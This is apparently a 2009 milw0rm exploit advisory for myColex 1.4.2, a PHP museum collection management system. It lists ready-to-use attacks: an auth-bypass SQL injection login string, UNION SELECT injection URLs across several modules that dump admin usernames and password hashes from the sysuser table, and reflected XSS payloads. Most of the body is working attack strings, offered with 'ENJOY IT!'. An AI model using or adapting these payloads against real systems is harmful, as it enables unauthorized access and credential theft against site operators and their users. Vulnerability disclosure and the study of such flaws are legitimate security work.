<html><head><title>my-colex 1.4.2 (AB/XSS/SQL) Multiple Remote Vulnerabilities</title></head><pre>***********************************************************************************************
***********************************************************************************************
**	       										     **
**  											     **
**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
** [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
**							                                     **
**    											     **
**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
**					¡PROUD TO BE SPANISH!				     **
**											     **
***********************************************************************************************
***********************************************************************************************

----------------------------------------------------------------------------------------------
|       	   	        MULTIPLE REMOTE VULNERABILITIES	  	          	     |
|--------------------------------------------------------------------------------------------|
|                         	|        my-colex 1.4.2        |		 	     |
|  CMS INFORMATION:		 ------------------------------			             |
|										             |
|--&gt;WEB: http://www.collector.ch/drupal5/index.php    		     			     |
|--&gt;DOWNLOAD: http://www.collector.ch/drupal5/?q=node/11          	                     |
|--&gt;DEMO: http://www.collector.ch/drupal5/?q=node/10					     |
|--&gt;CATEGORY: Management								     |
|--&gt;DESCRIPTION: myColex is a complete museum management and collection documentation        |
|		system with longterm archiving capabilities based on Apache/PHP and mySQL... |
|--&gt;RELEASED: 2009-03-24								     |
|											     |
|  CMS VULNERABILITY:									     |
|											     |
|--&gt;TESTED ON: firefox 3						                     |
|--&gt;DORK: N/A									             |
|--&gt;CATEGORY: AUTH BYPASS/ SQL INJECTION / XSS					             |
|--&gt;AFFECT VERSION: 1.4.2 (maybe &lt;= ?)				 		     	     |
|--&gt;Discovered Bug date: 2009-05-06							     |
|--&gt;Reported Bug date: 2009-05-06							     |
|--&gt;Fixed bug date: 2009-05-07								     |
|--&gt;Info patch: http://www.collector.ch/drupal5/?q=forum/15			             |
|--&gt;Author: YEnH4ckEr									     |
|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
|--&gt;WEB/BLOG: N/A									     |
|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
----------------------------------------------------------------------------------------------


#################
/////////////////

INTRODUCTION:

/////////////////
#################


This app is completely vulnerable to sql code injection.

Except auth bypass we can not exploit sql injection without a register user.


#########################
////////////////////////

AUTH BYPASS (SQLi):

////////////////////////
#########################


&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: magic quotes=OFF +++++++++++++++++---------&gt;&gt;&gt;&gt;


----------
EXPLOIT:
----------

Name=' or 1=1#

password=123456 (over six characters)

Then, going to http://[HOST]/[HOME_PATH]/modules/admuser.php?Modus=Find

We got admin credentials...

Password is encrypted with MySQLSHA-1.


#########################
////////////////////////

SQL INJECTION (SQLi):

////////////////////////
#########################


&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: Be a register user +++++++++++++++++---------&gt;&gt;&gt;&gt;

&lt;&lt;&lt;&lt;---------++++++++++++++ Condition: magic quotes = ON/OFF +++++++++++++++++---------&gt;&gt;&gt;&gt;


------------------
PROOF OF CONCEPT:
------------------


Some examples:

http://[HOST]/[HOME_PATH]/modules/kategorie.php?Modus=Detail&amp;ID=1+and+0+union+all+select+1,version(),database(),user(),version()%23

http://[HOST]/[HOME_PATH]/modules/medium.php?Modus=Detail&amp;ID=23+and+0+UNION+ALL+SELECT+1,version(),database(),version(),user(),database(),7/*

http://[HOST]/[HOME_PATH]/modules/person.php?Modus=Detail&amp;ID=2+AND+0+UNION+ALL+SELECT+1,2,3,4,version(),6,user(),version(),database(),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36/*

http://[HOST]/[HOME_PATH]/modules/schlagwort.php?Modus=Detail&amp;ID=1+AND+0+UNION+ALL+SELECT+1,version(),database(),current_user(),user(),6/*

There are more...

Return: user, version, ...


----------
EXPLOITS:
----------


http://[HOST]/[HOME_PATH]/modules/kategorie.php?Modus=Detail&amp;ID=1+and+0+union+all+select+1,SuUser,SuEmail,SuPwd,SuSysAut+FROM+sysuser+WHERE+SuID=1%23

http://[HOST]/[HOME_PATH]/modules/medium.php?Modus=Detail&amp;ID=23+and+0+UNION+ALL+SELECT+1,2,3,4,SuUser,SuPwd,6+FROM+sysuser+WHERE+SuID=1/*

Return: username/password (id=1)


###########################
///////////////////////////

CROSS SITE SCRIPTING (XSS):

///////////////////////////
###########################


XSS is possible where you like :P

Some examples:


http://[HOST]/[HOME_PATH]/modules/kalender.php?month=5&amp;year=2009&quot;&gt;&lt;script&gt;alert('y3nh4ck3r+was+here!')&lt;/script&gt;

http://[HOST]/[HOME_PATH]/modules/ereignis.php?Modus=List&amp;Page=1&quot;&gt;&lt;script&gt;alert('y3nh4ck3r+was+here!')&lt;/script&gt;&amp;Order=ErAnfangsdatum

http://[HOST]/[HOME_PATH]/modules/kategorie.php?Modus=Search&amp;Kontext=objekt&quot;&gt;&lt;script&gt;alert('y3nh4ck3r+was+here!')&lt;/script&gt;

http://[HOST]/[HOME_PATH]/modules/image.php?image=&lt;script&gt;alert('y3nh4ck3r+was+here!')&lt;/script&gt;


Of course there are more...



&lt;&lt;&lt;-----------------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!



#######################################################################
#######################################################################
##*******************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
##*******************************************************************##
#######################################################################
#######################################################################

# milw0rm.com [2009-05-15]</pre></html>